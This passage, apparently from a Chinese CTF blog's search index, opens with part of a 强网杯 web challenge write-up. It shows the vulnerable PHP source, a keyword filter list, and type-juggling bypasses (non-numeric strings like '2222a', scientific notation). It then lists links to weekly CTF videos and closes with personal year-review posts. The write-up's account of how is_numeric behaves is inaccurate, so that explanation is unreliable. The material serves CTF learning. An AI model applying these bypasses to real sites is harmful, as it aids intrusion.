class="variable">$num3</span>),<span class="number">0</span>,<span class="number">7</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;第三层&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(!(<span class="variable">$num4</span> &lt; <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4</span> == <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4</span> &lt;= <span class="number">0</span>)&amp;&amp;(strlen(<span class="variable">$num4</span>) &gt; <span class="number">6</span>)&amp;&amp;(strlen(<span class="variable">$num4</span>) &lt; <span class="number">8</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$num4</span>) )&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;第四层&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$num5</span>)||(strlen(<span class="variable">$num5</span>)==<span class="number">0</span>)) <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                    <span class="variable">$b</span>=json_decode(@<span class="variable">$num5</span>);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$y</span> = <span class="variable">$b</span> === <span class="literal">NULL</span>)&#123;</span><br><span class="line">                                <span class="keyword">if</span>(<span class="variable">$y</span> === <span class="literal">true</span>)&#123;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="string">&quot;第五层&quot;</span>;</span><br><span class="line">                                    <span class="keyword">include</span> <span class="string">&#x27;KeY1lhv.php&#x27;</span>;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="variable">$KEY1</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no111&quot;</span>);&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filter_word</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;KeY1lhv&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;num&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\,&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;0000000&#x27;</span>);</span><br><span class="line">        <span class="variable">$filter_phrase</span>= <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_word</span>).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="variable">$filter_phrase</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>开头给我们过滤了一些词，也就是说我们给的payload不可以有这些单词，这里面感觉最有用的就是<code>000000</code> 了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num1</span>) &amp;&amp; is_numeric(<span class="variable">$num1</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;非数字&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num1</span> &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;第一层&quot;</span>;</span><br></pre></td></tr></table></figure><p>这个第一层是必须要输入num1，且不能是数字，是数字的话，就直接进入else<code>die</code>了。<br>那么这里我们可以用<code>is_numeric</code>的一个缺陷来利用，<code>is_numeric</code>函数判断变量是否为数字，如果是数字返回1，否则返回0，但当输入的变量有数字和字母时，它会截取第一个字母之前的数字，且返回0，举个栗子，<code>is_numeric(1234abc123)</code>，这里它会取1234，而后面的abc他就不要了。那这样的话我们第一层，这里我们只需<code>ppp[number1]=2222a</code>，只要比1024大就可以了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num2</span>) &amp;&amp; strlen(<span class="variable">$num2</span>) &lt;= <span class="number">4</span> &amp;&amp; intval(<span class="variable">$num2</span> + <span class="number">1</span>) &gt; <span class="number">500000</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;第二层&quot;</span>;</span><br></pre></td></tr></table></figure><p>第二层，必须输入输入num2且长度小于或等于4且这个数加一要大于500000<br>正常四位数最大9999显然不大于500000<br>这里我们可以用php里的科学计数法，<code>1e3=1*10^3</code>也就是说</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> 强网杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>合天网安weekly,10-18周</title>
      <link href="/2020/09/10/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp10-18/"/>
      <url>/2020/09/10/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp10-18/</url>
      
        <content type="html"><![CDATA[<h1 id="第九周-试下phpinfo吧"><a href="#第九周-试下phpinfo吧" class="headerlink" title="第九周 | 试下phpinfo吧"></a>第九周 | 试下phpinfo吧</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1WZ4y1H7gt">第九周 | 试下phpinfo吧</a></p><h1 id="第十周-试试协议吧"><a href="#第十周-试试协议吧" class="headerlink" title="第十周 | 试试协议吧"></a>第十周 | 试试协议吧</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1Hz411v7c7">第十周 | 试试协议吧</a></p><hr><h1 id="第十一周-签到般的包含"><a href="#第十一周-签到般的包含" class="headerlink" title="第十一周 | 签到般的包含"></a>第十一周 | 签到般的包含</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV18v411q7mr">第十一周 | 签到般的包含</a></p><hr><h1 id="第十二周-easy-LFI"><a href="#第十二周-easy-LFI" class="headerlink" title="第十二周 | easy LFI"></a>第十二周 | easy LFI</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1jD4y1U7Vy">第十二周 | easy LFI</a></p><hr><h1 id="第十三周-simple-xxe"><a href="#第十三周-simple-xxe" class="headerlink" title="第十三周 | simple xxe"></a>第十三周 | simple xxe</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1eT4y1j7ff/">第十三周 | simple xxe</a></p><hr><h1 id="第十四周-blind-xxe"><a href="#第十四周-blind-xxe" class="headerlink" title="第十四周 | blind xxe"></a>第十四周 | blind xxe</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1nK411n7G9/">第十四周 | blind xxe</a></p><hr><h1 id="第十五周-回显的SSRF"><a href="#第十五周-回显的SSRF" class="headerlink" title="第十五周 | 回显的SSRF"></a>第十五周 | 回显的SSRF</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV18f4y197Lz/">第十五周 | 回显的SSRF</a></p><hr><h1 id="第十六周-有点另类的SSRF"><a href="#第十六周-有点另类的SSRF" class="headerlink" title="第十六周 | 有点另类的SSRF"></a>第十六周 | 有点另类的SSRF</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1g54y1U7Gj/">第十六周 | 有点另类的SSRF</a></p><hr><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>打波广告,我的bilibili主页<a href="https://space.bilibili.com/454748309">关注我</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> 合天网安 </tag>
            
            <tag> 视频讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>合天网安weekly,1-9周</title>
      <link href="/2020/05/30/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp1-9/"/>
      <url>/2020/05/30/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp1-9/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="第一周-神奇的磁带"><a href="#第一周-神奇的磁带" class="headerlink" title="第一周 | 神奇的磁带"></a>第一周 | 神奇的磁带</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1DA411q7Go">第一周 | 神奇的磁带</a></p><hr><h1 id="第二周-就差一把钥匙"><a href="#第二周-就差一把钥匙" class="headerlink" title="第二周 | 就差一把钥匙"></a>第二周 | 就差一把钥匙</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1np4y1X7L5">第二周 | 就差一把钥匙</a></p><hr><h1 id="第三周-迷了路"><a href="#第三周-迷了路" class="headerlink" title="第三周 | 迷了路"></a>第三周 | 迷了路</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV16K4y1t7jg">第三周 | 迷了路</a></p><hr><h1 id="第四周-Check-your-source-code"><a href="#第四周-Check-your-source-code" class="headerlink" title="第四周 | Check your source code"></a>第四周 | Check your source code</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1254y1D7Jy">第四周 | Check your source code</a></p><hr><h1 id="第五周-Easy-upload"><a href="#第五周-Easy-upload" class="headerlink" title="第五周 | Easy upload"></a>第五周 | Easy upload</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1KT4y1g7kr">第五周 | Easy upload</a></p><hr><h1 id="第六周-套娃一样的上传"><a href="#第六周-套娃一样的上传" class="headerlink" title="第六周 | 套娃一样的上传"></a>第六周 | 套娃一样的上传</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1mZ4y1p7vz">第六周 | 套娃一样的上传</a></p><hr><h1 id="第七周-再见上传"><a href="#第七周-再见上传" class="headerlink" title="第七周 | 再见上传"></a>第七周 | 再见上传</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1J5411x7Pt">第七周 | 再见上传</a></p><hr><h1 id="第八周-随意的上传"><a href="#第八周-随意的上传" class="headerlink" title="第八周 | 随意的上传"></a>第八周 | 随意的上传</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV14K411n7Wx">第八周 | 随意的上传</a></p><hr><h1 id="第九周-试下phpinfo吧"><a href="#第九周-试下phpinfo吧" class="headerlink" title="第九周 | 试下phpinfo吧"></a>第九周 | 试下phpinfo吧</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1WZ4y1H7gt">第九周 | 试下phpinfo吧</a><br><br></p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>打波广告,我的bilibili主页<a href="https://space.bilibili.com/454748309">关注我</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> 合天网安 </tag>
            
            <tag> 视频讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>welcome</title>
      <link href="/2020/05/08/hello/"/>
      <url>/2020/05/08/hello/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="nonono" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="de5ffb3c355c37ef799db2811598b2e070118f1713db3c35b69817df54f1f8bd">7d8077bcea34d13a4778951ea2d2a1ccce0256bcc5d53f74bd6a858a945ec856276f2040ce3d91d145e95f65e63f536f564e07d3cc9ab9bb1fec22f262ad5a1e4fc99d0818f3a1cac7c2a6ea11b53f62975da05ba3343ad48b5b02b81e9efdecc44f4cfae33f5b10a48fc74460bc07491e960d4fafcb54b004ecfbeea566d704f0c8dbe63cbc78689d284f0b5ad3a587f242b222d0b826a89be3bd4b53523e4bc9784da2af2b9a4b4964e07bf508abff229ea78940ea4ab41dcb1bc2e390f9b90a3a4d5305b40a26e6a9bff33925686133c51d622f4a40bd556070284614620e2478b030f3e24a2f0fc1059e8599c5d6d0113e42c0625302624527d4c5bbe72d2047dfe2b04d78e73e5a0e581acdfd5e25fa6e38bd1cc24c265adf6d30fc068f6c4a4780a711c842d7a61d4a47ee8279eddfe9b090d6b98ab038348eeb86901f543edcd2263d3754d9ba2365ec8b1ada36f8cd6f88f8f0487f1f87c6cb1f2d436f513591ad5424d63cac089b792a884c4b773dc9738c626011ece68dbfe6a418dd7dada87289fa995942802846b8636490a62484c23728ffde04fc9f4475713dee7b1cfdf174e13d275c70ceeda5876c7392d6f064ec19ebaf13a894258a7d8577b9e722cfa10daef2e53f7918b0aeab</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">please input my name</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>my2021</title>
      <link href="/2000/01/31/my2021/"/>
      <url>/2000/01/31/my2021/</url>
      
        <content type="html"><![CDATA[<p>首先，新年到啦，先祝大家新年快乐啦！<br>很快，2021年已经过去了，感觉还没学到什么时间就很快的过去了，也可能是自己没有把握好时间吧。一年确实也认识了好多好多的人，也经历了好多好多的事情，在此也记录下2021年所发生有趣且有意义的事情吧。</p><p><img src="/images/my2021/1.png" alt="image-20220130142802861"></p><p>一二三月份都在准备考试，最后不管怎么样吧，考上了，还是挺高兴的。</p><p>五月份，首先在还是要感谢澳哥带我打进铁人总决赛吧，人生中第一次在这么大的舞台上，和众多高校的小伙伴一起打比赛，真的是太强了，感受颇多。打比赛很累，做不出题来，更累。还是那句话人外有人，天外有天，强的人真是太多了，不努力的话，真的啥也不是。记录一下参赛过程吧，贴两张照片。感谢澳哥。<img src="/images/my2021/2.png" alt="image-20220130144246418"></p><p><img src="/images/my2021/3.png" alt="image-20220130144314957"></p><p><img src="/images/my2021/4.png" alt="image-20220130144329029"></p><p><img src="/images/my2021/5.png" alt="image-20220130144830848"></p><p>五月份作为特邀战队参加了津门杯，感谢张老师对我的信任，让我带队，带学弟和学妹参加比赛，真是到了赛场上才知道自己有多菜，坐在电脑前就很紧张，一会干这，一会干那，手忙脚乱的，最主要的原因还是脑子里没有那么多东西吧，那些高校战队真的太强了，被打的很惨。不过，最后也有幸也去了世界智能大会，虽然没听懂吧，但是我还是装听懂了吧。贴两张照片记录一下吧。感谢张老师和学弟学妹。</p><p><img src="/images/my2021/6.png" alt="image-20220130145559697"></p><p><img src="/images/my2021/7.png" alt="image-20220130145615187"></p><p><img src="/images/my2021/8.png" alt="image-20220130145623269"></p><p><img src="/images/my2021/9.png" alt="image-20220130145635833"></p><p><img src="/images/my2021/10.png" alt="image-20220130145713244"></p><p><img src="/images/my2021/11.png" alt="image-20220130150437476"></p><p>六月底七月初也为国家做了一些贡献吧。当然也给自己增加技术和经验以及履历了。感谢绳哥。</p><p>九月份第一次站在这么大的舞台上演讲，很紧张，也很期待。总体来说还算成功吧，感谢小伙伴帮我拍的照，贴一张吧。打码打码。</p><p><img src="/images/my2021/12.png" alt="image-20220130163040609"></p><p>十月份。感谢于老师。让我能有一次锻炼自己的机会。</p><p>十一月份也去了海河工匠杯，成绩中规中矩吧，证书就不贴了，也没啥意思。不过那天起的非常早，雪非常大，风非常大，路非常滑，天也贼冷。</p><p>还有天津市赛，第一次参加，还是太菜了，没有拿到名次，愧疚了好久，辜负了西普老师对我的期望，哎，谁也不怪，只能说准备的不充分。人家比我们准备的多，哎，没办法，总结教训，继续努力吧。感谢西普的老师，感谢我的小伙伴们。</p><p>感谢陈老师的键盘和鼠标。</p><p>感谢郭老师对我的信任。让我能有一次锻炼自己的机会。</p><p>后面就是非常幸运的进入了西普这个大家庭吧，认识了许多可爱的小伙伴，和厉害的老师。希望能在这里不浪费时间，学习到更多知识吧。感谢西普的老师。</p><p>感谢凡哥对我的信任。我尽力。</p><p>感谢父母。</p><p>今年也遇到了许多可爱的小伙伴，和厉害的师傅，学到了很多以前没有见过的东西。今年也浪费了好多的时间放在自己不喜欢的事情上，明年或许也会花许多时间放在自己不喜欢的地方，哎没办法，谁让自己起点低呢。加油吧！</p><p>好久好久以前就有了这个博客，但是由于各种各样的原因吧，都没有及时的更新文章，有的时候感觉一个小比赛就解出来一道题，或简单的题，没必要记录，但是后来在遇到这个题发现是以前见到过的，有没有笔记，各种百度浪费时间，还找不到自己想要的。另一方面感觉做这个事情也是挺锻炼自己的，写出来解题过程很开心。以后会监督自己，时常更新博客，多做题。说的再多，归根结底还是自己太懒了吧。以后勤奋一些。多做有意义的事情。多更博客。</p><p>”我从不相信一帆风顺的说法，一帆风顺代表着你没有遇到任何困难，也就说你没有经历过打击，也就没有积累相对应的经验。学走路要经历摔跤，学骑自行车要经历摔跤，学滑雪要经历摔跤，你需要体验那种摔跤的痛感，你才能够在摔跤前做出相应的动作来让自己回归正轨。我们假设一个场景，你下面是万丈深渊，而你要徒手攀岩，从一个垂直坡度的山脚，爬到上千米的山顶。用脚指头都能想到，你死亡的场景无数个，只要一次失误你就可能掉落山崖粉身碎骨，而你的成功场景只有一个：活着上去。所以你对这座山要有心存敬畏，要小心翼翼，不炫技不张扬，你要调整到最谦卑的状态，远离喧嚣，听到自己心跳的声音，敬畏每一个抓手点。抓手的点很多，有大有小，你不能重视一个而轻视另一个，因为你轻视任何一个的后果都是一样的，那就是死亡。“  </p><p>送给自己，谦卑一些。</p><p>生日快乐~<br><img src="/images/my2021/13.png" alt="image-20220130172521536"></p><blockquote><p>生日快乐<br>一直在路上<br>加油！<br>读书太少，想的太多</p><p>date: 2022-01-31 00:00:00</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>my2022</title>
      <link href="/2000/01/20/my2022/"/>
      <url>/2000/01/20/my2022/</url>
      
        <content type="html"><![CDATA[<p>首先，新年到了，祝大家新年快乐喽！<br>很快，2022年已经过去了，2023年已经过去20多天了，时间就很快的过去了，也可能是自己没有把握好时间吧。在过去的一年中认识了一些人，都非常有趣。也遇到了很多有趣的事情。</p><p>感谢jackie哥给我推重保，二月份冬奥会去重保，认识了好几个有趣的哥哥，人都挺好的，还总帮我登机器。感谢。后面还帮他们写了个小脚本，帮他们筛选日志中有用信息导出excel，由于内网使用还封成了exe，完事后那边的哥说贼还用，帮他们省去了90%的时间，还很感谢我。瞬间感觉其实看设备不适合我，我感觉运维比较适合我。因为，……。</p><p>四月份和五月份吧，感谢俺们郭老师让我帮他带了十几天课，感谢郭老师又给我了一次这么好的锻炼机会。感觉当老师好辛苦啊，emmmm，其实当导师不是很辛苦，就是有些东西明明在课上我已经讲过了，然后呢，有同学课下又来问，而且还不是一个同学问，好多同学都来问。这里可能不是我没有讲过，是我布置了作业，都没有听，来问的很累。布置作业也很累。emmmm，还有一个，同学抄作业也挺严重的，那作业截图linux用户名都一样，我裂开。看到作业，我瞬间感觉我这个老师当的很失败，没有教会大家。最后一点，要是当老师不用布置作业，不用改作业，同学们不要一直问同一个我上课讲过的问题的话，我感觉当老师还是蛮舒服的。讲课做视频还是蛮不错的，没有售后。</p><p>七月份，感谢A佬给我推了个讲ctf课的兼职。从中也学到了许多讲课的技巧，也学到了很多知识。我觉得现在让我打2019年那个awd比赛，我一定打穿他们。感谢A佬。</p><p>八月份还回家学了个车，emmm，难度中等吧，希望早点拿到证，就能开车了。</p><p>九月，感谢凡哥信任我，给我锻炼自己的机会，让我参加了个讲座。</p><p>十一月份的天津大学生ctf比赛，emmmm，怎么说呢，初赛打的还行，决赛嘛，感觉还是自己太菜了一点，没有团队。一个人的能力确实是有限的，当然不能排除那些全栈的大佬，是真的强。比赛也就得了二等奖，少点py，少点代打，或许有机会拿个一等奖。以学生身参加的比赛越来越少了，珍惜吧。不过安全这条路，我是不会放弃的。</p><blockquote><p>十二月份就比较特殊了，这是我这一年中发生的最大的事情了，得到了一个我喜欢的女孩。从此以后，我也将不再是孤单的一人。身份也多了一个，感觉肩上的责任更重了些。</p><p>终于和过去说了再见，是时候开始新的生活了。</p><p><img src="/images/my2022/1.jpg" alt="image-20220130142802861"></p></blockquote><p>希望明年可以找到一份实习工作，多多更新博客。</p><p>需要感谢的人太多，对我的好我都记得。</p><p>“我从不相信一帆风顺的说法，一帆风顺代表着你没有遇到任何困难，也就说你没有经历过打击，也就没有积累相对应的经验。学走路要经历摔跤，学骑自行车要经历摔跤，学滑雪要经历摔跤，你需要体验那种摔跤的痛感，你才能够在摔跤前做出相应的动作来让自己回归正轨。”</p><p>送给自己，谦卑一些。</p><blockquote><p>生日快乐~<br>一直在路上<br>加油！<br>读书太少，想的太多<br>date: 2023-01-20 00:00:00</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
